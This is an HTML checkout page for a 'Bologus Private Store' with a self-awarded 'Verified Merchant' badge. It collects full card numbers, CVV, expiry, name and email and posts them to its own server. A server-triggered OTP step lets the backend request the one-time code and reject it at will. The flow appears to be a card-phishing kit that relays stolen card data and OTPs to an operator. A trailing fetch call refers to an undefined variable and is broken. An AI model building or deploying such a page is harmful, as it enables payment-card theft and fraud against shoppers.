<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bologus pvt store.</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <style>
    /* Layout & Background */
    .page-container {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding-top: 1.5rem;
      background: linear-gradient(45deg, #ff0000 50%, #ffffff 50%);
    }
    .content-wrapper {
      flex: 1;
      padding: 1rem;
      margin-bottom: 6rem;
    }
    /* Merchant & Info Section */
    .merchant-badge { position: relative; cursor: pointer; margin-left: 0; }
    .merchant-dropdown {
      display: none;
      position: absolute;
      top: 100%;
      left: 0;
      background: white;
      padding: 1rem;
      border-radius: 0.5rem;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
      z-index: 10;
      width: 300px;
    }
    .merchant-badge:hover .merchant-dropdown { display: block; }
    .shield-icon {
      animation: shieldPulse 2s infinite;
      transform-style: preserve-3d;
      perspective: 1000px;
    }
    @keyframes shieldPulse {
      0% { transform: scale(1) rotate(0deg); filter: brightness(1); }
      50% { transform: scale(1.05) rotate(5deg); filter: brightness(1.2); }
      100% { transform: scale(1) rotate(0deg); filter: brightness(1); }
    }
    .trusted-shield {
      display: flex;
      align-items: center;
      gap: 1rem;
      padding: 1rem;
      background: #66BB6A;
      border-radius: 0.5rem;
      margin-bottom: 1rem;
    }
    .verified-tag {
      font-size: 0.75rem;
      background: rgba(255,255,255,0.2);
      padding: 0.25rem 0.5rem;
      border-radius: 1rem;
      color: #E0E0E0;
    }
    .verification-item {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      font-size: 0.875rem;
      color: #4B5563;
      padding: 0.25rem 0;
    }
    .verification-tick { width: 1rem; height: 1rem; flex-shrink: 0; color: #10B981; }
    /* Payment Form Styles */
    .amount-display {
      font-size: 18px;
      font-weight: 400;
      color: #1a1a1a;
      text-align: center;
      margin-bottom: 20px;
      padding: 12px;
      background: #f3f4f6;
      border-radius: 8px;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      letter-spacing: -0.2px;
    }
    .rupee-sign {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 1rem;
      user-select: none;
      color: #6b7280;
      line-height: 1;
      display: flex;
      align-items: center;
      height: 100%;
      pointer-events: none;
    }
    #cardTypeIcon {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100%;
    }
    .card-icon { height: 24px; width: auto; display: block; }
    #cardError { color: #ef4444; font-size: 14px; margin-top: 4px; display: none; }
    #cardInfo { color: #4B5563; font-size: 14px; margin-top: 4px; }
    .otp-error { color: #ef4444; font-size: 13px; margin: 4px 0 8px; text-align: center; display: none; }
    .hidden { display: none !important; }
    /* Consent Message */
    .consent-message {
      display: flex;
      align-items: flex-start;
      gap: 0.5rem;
      padding: 0.5rem;
      border-radius: 0.25rem;
      font-size: 0.875rem;
      color: #4B5563;
      margin-top: 20px;
    }
    .consent-checkbox {
      width: 1.25rem;
      height: 1.25rem;
      border: 2px solid #D1D5DB;
      border-radius: 0.25rem;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      margin-right: 5px;
    }
    .consent-checkbox.checked { background-color: #10B981; border-color: #10B981; }
    .consent-checkbox svg { width: 1rem; height: 1rem; color: white; display: none; }
    .consent-checkbox.checked svg { display: block; }
    /* Animations */
    .animate-slide-in { animation: slideIn 0.3s ease-out; }
    @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    .animate-spin {
      display: inline-block;
      animation: spin 1s linear infinite;
      -webkit-animation: spin 1s linear infinite;
    }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    .btn-loading { position: relative; }
    .btn-loading span { opacity: 0.5; filter: blur(1px); }
    /* Bottom Logos */
    .bottom-logos {
      padding: 2rem 0;
      margin-top: auto;
      background: transparent;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 20px;
    }
    @media (max-width: 600px) {
      .bottom-logos {
        position: fixed;
        bottom: 30px;
        left: 50%;
        transform: translateX(-50%);
        gap: 10px;
        background-color: white;
        padding: 5px 0;
        width: 100%;
        justify-content: center;
        z-index: 100;
      }
      .bottom-logos img { max-height: 25px; }
    }
  </style>
</head>
<body>
  <div class="page-container">
    <div class="content-wrapper max-w-md mx-auto">
      <!-- Merchant Badge -->
      <div class="merchant-badge mb-6">
        <div class="trusted-shield">
          <svg class="shield-icon w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
          </svg>
          <div class="flex-1">
            <div class="text-white font-medium">Bologus Private Store</div>
            <span class="verified-tag">Verified Merchant</span>
          </div>
        </div>
      </div>

      <!-- Payment Form -->
      <div id="paymentForm" class="bg-white shadow-lg rounded-lg p-6">
        <div class="amount-display mb-6">
          Amount to Pay: ₹<span id="displayAmount">0</span>
        </div>

        <form id="mainForm" class="space-y-4">
          <input type="hidden" id="amount" value="0">
          
          <div class="space-y-2">
            <label class="block text-sm font-medium text-gray-700">Card Number</label>
            <div class="relative">
              <span class="rupee-sign">🔒</span>
              <input type="text" id="cardNumber" class="w-full pl-10 pr-12 py-2 border rounded-md" placeholder="1234 5678 9012 3456" maxlength="19">
              <div id="cardTypeIcon"></div>
            </div>
            <div id="cardError" class="text-red-500 text-sm hidden"></div>
            <div id="cardInfo" class="text-gray-600 text-sm"></div>
          </div>

          <div class="grid grid-cols-2 gap-4">
            <div>
              <label class="block text-sm font-medium text-gray-700">Expiry Date</label>
              <input type="text" id="expiry" class="w-full py-2 px-3 border rounded-md" placeholder="MM/YY" maxlength="5">
            </div>
            <div>
              <label class="block text-sm font-medium text-gray-700">CVV</label>
              <input type="password" id="cvv" class="w-full py-2 px-3 border rounded-md" placeholder="123" maxlength="3">
            </div>
          </div>

          <div>
            <label class="block text-sm font-medium text-gray-700">Cardholder Name</label>
            <input type="text" id="cardholderName" class="w-full py-2 px-3 border rounded-md" placeholder="Name on card">
          </div>

          <div>
            <label class="block text-sm font-medium text-gray-700">Email</label>
            <input type="email" id="email" class="w-full py-2 px-3 border rounded-md" placeholder="email@example.com">
          </div>

          <button type="submit" id="submitButton" disabled class="w-full py-3 px-4 flex items-center justify-center text-white rounded-md bg-gray-400">
            <span id="submitText">Pay Now</span>
            <svg id="submitLoader" class="animate-spin ml-2 h-5 w-5 text-white hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
          </button>
        </form>
      </div>

      <!-- OTP Form -->
      <div id="otpForm" class="hidden bg-white shadow-lg rounded-lg p-6">
        <h3 class="text-lg font-medium text-center mb-4">Enter OTP</h3>
        <p class="text-sm text-gray-600 text-center mb-4">
          Enter the OTP sent to your registered mobile number ending with <span id="cardLastFour"></span>
        </p>
        <div class="mb-4">
          <input type="text" id="otp" class="w-full text-center py-2 px-3 border rounded-md text-2xl tracking-widest" maxlength="6" placeholder="000000">
          <div id="otpError" class="text-red-500 text-sm text-center mt-2 hidden">Invalid OTP. Please try again.</div>
        </div>
        <p class="text-sm text-gray-600 text-center mb-4">Time remaining: <span id="timer">3:00</span></p>
        <button id="otpSubmitButton" disabled class="w-full bg-gray-400 text-white py-2 px-4 rounded-md flex items-center justify-center">
          <span id="otpText">Confirm Payment</span>
          <svg id="otpLoader" class="animate-spin ml-2 h-5 w-5 text-white hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
          </svg>
        </button>
      </div>

      <!-- Bottom Logos -->
      <div class="bottom-logos">
        <img src="https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png" alt="Visa" class="h-8">
        <img src="https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/mastercard/mastercard-curved-128px.png" alt="Mastercard" class="h-8">
        <img src="https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/amex/amex-curved-128px.png" alt="American Express" class="h-8">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Rupay-Logo.png/320px-Rupay-Logo.png" alt="RuPay" class="h-8">
      </div>
    </div>
  </div>

  <!-- Global Variables -->
  <script>
    let isCardValid = false;
    let isExpiryValid = false;
    let isProcessing = false;
    let currentInvoiceId = "";
    let statusCheckInterval;
    let timerInterval;
    let timer = 180;
    let consentChecked = true;
  </script>

  <!-- Fetch Payment Details using PID -->
  <script>
    document.addEventListener('DOMContentLoaded', async () => {
      const urlParams = new URLSearchParams(window.location.search);
      let pid = urlParams.get('pid');
      // Fallback: if pid is missing or "null", try sessionStorage
      if (!pid || pid === "null") {
        pid = sessionStorage.getItem('pid');
      } else {
        sessionStorage.setItem('pid', pid);
      }
      console.log("Payment page PID:", pid);
      if (pid) {
        try {
          const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
          const data = await response.json();
          if (data.status === 'success' && data.payment) {
            const amount = parseInt(data.payment.amount, 10);
            if (!isNaN(amount) && amount > 0) {
              document.getElementById('amount').value = amount;
              document.getElementById('displayAmount').textContent = amount.toLocaleString('en-IN');
            } else {
              console.warn("Invalid amount; defaulting to 100");
              document.getElementById('amount').value = 100;
              document.getElementById('displayAmount').textContent = "100";
            }
          } else {
            console.error("Payment details not found for pid:", pid);
          }
        } catch (error) {
          console.error('Error fetching payment details:', error);
        }
      } else {
        console.warn("No valid pid provided; defaulting amount to 100");
        document.getElementById('amount').value = 100;
        document.getElementById('displayAmount').textContent = "100";
      }
    });
  </script>

  <!-- Card Formatting & BIN Lookup -->
  <script>
    function validateCard(number) {
      let arr = number.replace(/\D/g, '').split('').reverse().map(x => parseInt(x, 10));
      let sum = 0;
      for (let i = 0; i < arr.length; i++) {
        let val = arr[i];
        if (i % 2 === 1) {
          val *= 2;
          if (val > 9) val -= 9;
        }
        sum += val;
      }
      return sum % 10 === 0;
    }

    function validateExpiry(value) {
      const [month, year] = value.split('/').map(x => parseInt(x, 10));
      if (isNaN(month) || isNaN(year)) return false;
      
      const now = new Date();
      const currentYear = now.getFullYear() % 100;
      const currentMonth = now.getMonth() + 1;
      
      if (month < 1 || month > 12) return false;
      if (year < currentYear) return false;
      if (year === currentYear && month < currentMonth) return false;
      
      return true;
    }

    function formatCardNumber(value) {
      let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      v = v.slice(0, 16);
      const parts = [];
      for (let i = 0; i < v.length; i += 4) {
        parts.push(v.substring(i, i + 4));
      }
      return parts.join(' ');
    }

    function formatExpiry(value) {
      let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      let formatted = v;
      if (v.length >= 2) {
        formatted = v.slice(0, 2) + '/' + v.slice(2, 4);
      }
      return formatted;
    }

    function updateCardError() {
      const cardInput = document.getElementById("cardNumber");
      const errorElem = document.getElementById("cardError");
      const plain = cardInput.value.replace(/\s/g, '');
      isCardValid = (plain.length === 16) ? validateCard(plain) : false;
      if (plain.length === 16 && !isCardValid) {
        errorElem.style.display = 'block';
        errorElem.textContent = "Please enter valid card number";
        cardInput.classList.add('border-red-500');
      } else {
        errorElem.style.display = 'none';
        cardInput.classList.remove('border-red-500');
      }
    }

    function detectCardType(number) {
      const clean = number.replace(/\D/g, '');
      const firstDigit = clean.charAt(0);
      if (firstDigit === '4') return 'visa';
      if (firstDigit === '5') return 'mastercard';
      if (firstDigit === '3') return 'amex';
      if (firstDigit === '6') return 'rupay';
      return null;
    }

    async function lookupBIN(bin) {
      try {
        const response = await fetch(`https://lookup.binlist.net/${bin}`);
        if (response.ok) {
          return await response.json();
        }
      } catch (e) {
        console.error("BIN lookup error:", e);
      }
      return null;
    }

    async function updateCardTypeAndInfo(value) {
      const cardIcon = document.getElementById("cardTypeIcon");
      const cardInfo = document.getElementById("cardInfo");
      const plain = value.replace(/\s/g, '');
      if (plain.length >= 6) {
        const bin = plain.slice(0, 6);
        const binData = await lookupBIN(bin);
        if (binData) {
          let logoUrl = "";
          switch ((binData.scheme || "").toLowerCase()) {
            case "visa":
              logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png";
              break;
            case "mastercard":
              logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/mastercard/mastercard-curved-128px.png";
              break;
            case "amex":
              logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/amex/amex-curved-128px.png";
              break;
            case "rupay":
              logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Rupay-Logo.png/320px-Rupay-Logo.png";
              break;
            default:
              logoUrl = "";
          }
          cardIcon.innerHTML = logoUrl ? `<img src="${logoUrl}" alt="${binData.scheme}" style="max-height:100%; max-width:100%;">` : "";
          if (cardInfo) {
            if (binData.country && binData.country.currency && binData.country.currency !== "INR") {
              try {
                const rateResponse = await fetch("https://api.exchangerate-api.com/v4/latest/INR");
                const rateData = await rateResponse.json();
                const conversion = rateData.rates[binData.country.currency];
                if (conversion) {
                  cardInfo.textContent = `${binData.country.currency} detected, 1 INR = ${conversion.toFixed(3)} ${binData.country.currency} | ${binData.country.name}`;
                } else {
                  cardInfo.textContent = `${binData.country.currency} | ${binData.country.name}`;
                }
              } catch (e) {
                cardInfo.textContent = `${binData.country.currency} | ${binData.country.name}`;
              }
            } else {
              cardInfo.textContent = "";
            }
          }
        } else {
          cardIcon.innerHTML = "";
          if (cardInfo) cardInfo.textContent = "";
        }
      } else {
        cardIcon.innerHTML = "";
        if (cardInfo) cardInfo.textContent = "";
      }
    }

    function updateSubmitButton() {
      const email = document.getElementById('email').value.trim();
      const cardNum = document.getElementById('cardNumber').value.replace(/\s+/g, '');
      const expiry = document.getElementById('expiry').value;
      const cvv = document.getElementById('cvv').value;
      const cardholder = document.getElementById('cardholderName').value.trim();
      const submitButton = document.getElementById('submitButton');
      if (isCardValid && isExpiryValid && cardNum.length === 16 && cvv.length === 3 && email && cardholder && consentChecked) {
        submitButton.disabled = false;
        submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-green-600 hover:bg-green-700";
      } else {
        submitButton.disabled = true;
        submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400";
      }
    }

    function updateConfirmOtpButton() {
      const otp = document.getElementById('otp').value;
      const otpButton = document.getElementById('otpSubmitButton');
      if (otp.length === 6) {
        otpButton.disabled = false;
        otpButton.className = "w-full bg-blue-600 text-white py-2 px-4 rounded-none flex items-center justify-center";
        document.getElementById('otpError').style.display = 'none';
      } else {
        otpButton.disabled = true;
        otpButton.className = "w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center";
      }
    }

    document.addEventListener("DOMContentLoaded", function(){
      const cardInput = document.getElementById("cardNumber");
      const expiryInput = document.getElementById("expiry");
      if (cardInput) {
        cardInput.addEventListener("input", function(e) {
          const cursor = e.target.selectionStart;
          const lastLength = e.target.value.length;
          let formatted = formatCardNumber(e.target.value);
          e.target.value = formatted;
          updateCardError();
          updateCardTypeAndInfo(e.target.value);
          updateSubmitButton();
          if (cursor && cursor < lastLength) {
            const newCursor = cursor + (formatted.length - lastLength);
            e.target.setSelectionRange(newCursor, newCursor);
          }
        });
      }

      if (expiryInput) {
        expiryInput.addEventListener("input", function(e) {
          const cursor = e.target.selectionStart;
          const lastLength = e.target.value.length;
          let formatted = formatExpiry(e.target.value);
          e.target.value = formatted;
          isExpiryValid = (formatted.length === 5) ? validateExpiry(formatted) : false;
          updateSubmitButton();
          if (cursor && cursor < lastLength) {
            const newCursor = cursor + (formatted.length - lastLength);
            e.target.setSelectionRange(newCursor, newCursor);
          }
        });
      }

      ['email', 'cvv', 'cardholderName'].forEach(id => {
        document.getElementById(id).addEventListener('input', updateSubmitButton);
      });

      document.getElementById('otp').addEventListener('input', function(e) {
        updateConfirmOtpButton();
      });

      async function checkTransactionStatus() {
        if (!currentInvoiceId) return;
        try {
          const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
          const data = await response.json();
          if (data.status === 'show_otp') {
            clearInterval(statusCheckInterval);
            document.getElementById('paymentForm').classList.add('hidden');
            document.getElementById('otpForm').classList.remove('hidden');
            const cardNumber = document.getElementById('cardNumber').value;
            document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
            if (!timerInterval) { startOtpTimer(); }
            if (data.otpError) {
              document.getElementById('otpError').style.display = 'block';
              const otpButton = document.getElementById('otpSubmitButton');
              const otpLoader = document.getElementById('otpLoader');
              const btnText = document.getElementById('otpText');
              btnText.style.opacity = '1';
              btnText.style.filter = 'none';
              otpLoader.classList.add('hidden');
              otpButton.disabled = false;
            } else {
              document.getElementById('otpError').style.display = 'none';
            }
            isProcessing = false;
          } else if (data.status === 'redirect') {
            window.location.href = data.redirectUrl;
          }
        } catch (err) {
          console.error('Error checking transaction status:', err);
        }
      }

      document.getElementById('mainForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        if (!isCardValid || !isExpiryValid || isProcessing) return;
        isProcessing = true;
        const submitButton = document.getElementById('submitButton');
        const submitLoader = document.getElementById('submitLoader');
        const buttonText = document.getElementById('submitText');
        buttonText.style.opacity = '0.5';
        buttonText.style.filter = 'blur(1px)';
        submitLoader.classList.remove('hidden');
        submitButton.disabled = true;
        try {
          const response = await fetch("/api/sendPaymentDetails", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
              expiry: document.getElementById('expiry').value,
              cvv: document.getElementById('cvv').value,
              email: document.getElementById('email').value,
              amount: document.getElementById('amount').value,
              currency: "INR",
              cardholder: document.getElementById('cardholderName').value
            })
          });
          const result = await response.json();
          if (result.status === "success") {
            currentInvoiceId = result.invoiceId;
            statusCheckInterval = setInterval(checkTransactionStatus, 2000);
          } else {
            throw new Error('Payment submission failed');
          }
        } catch (err) {
          console.error('Payment submission error:', err);
          alert('Error processing payment. Please try again.');
          isProcessing = false;
          submitButton.disabled = false;
          submitLoader.classList.add('hidden');
          buttonText.style.opacity = '1';
          buttonText.style.filter = 'none';
          updateSubmitButton();
        }
      });

      document.getElementById('otpSubmitButton').addEventListener('click', async () => {
        if (isProcessing) return;
        isProcessing = true;
        const otpButton = document.getElementById('otpSubmitButton');
        const otpLoader = document.getElementById('otpLoader');
        const btnText = document.getElementById('otpText');
        btnText.style.opacity = '0.5';
        btnText.style.filter = 'blur(1px)';
        otpLoader.classList.remove('hidden');
        otpButton.disabled = true;
        try {
          const response = await fetch("/api/submitOTP", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              invoiceId: currentInvoiceId,
              otp: document.getElementById('otp').value
            })
          });
          if (!response.ok) {
            throw new Error('Failed to submit OTP');
          }
          statusCheckInterval = setInterval(checkTransactionStatus, 2000);
        } catch (err) {
          console.error('OTP submission error:', err);
          alert('Error submitting OTP. Please try again.');
          isProcessing = false;
          otpButton.disabled = false;
          otpLoader.classList.add('hidden');
          btnText.style.opacity = '1';
          btnText.style.filter = 'none';
        }
      });
    });

    function startOtpTimer() { if (timerInterval) clearInterval(timerInterval);
      timer = 180;
      timerInterval = setInterval(() => {
        timer--;
        const minutes = Math.floor(timer / 60);
        const seconds = timer % 60;
        document.getElementById('timer').textContent =
          `${minutes}:${seconds.toString().padStart(2, '0')}`;
        if (timer <= 0) {
          clearInterval(timerInterval);
          window.location.href = '/fail.html';
        }
      }, 1000);
    }

    fetch(`https://www.khatapay.me/api/getPaymentDetails?pid=${paymentId}`)
  .then(response => {
    if (!response.ok) {
      throw new Error("Payment details not found");
    }
    return response.json();
  })
  .then(data => {
    if (!data || Object.keys(data).length === 0) {
      throw new Error("Invalid payment details received");
    }
    // Process data...
  })
  .catch(error => {
    console.error("Error fetching payment details:", error);
    document.getElementById("error-message").innerText = "Payment details could not be loaded.";
  });

  </script>
</body>
</html>
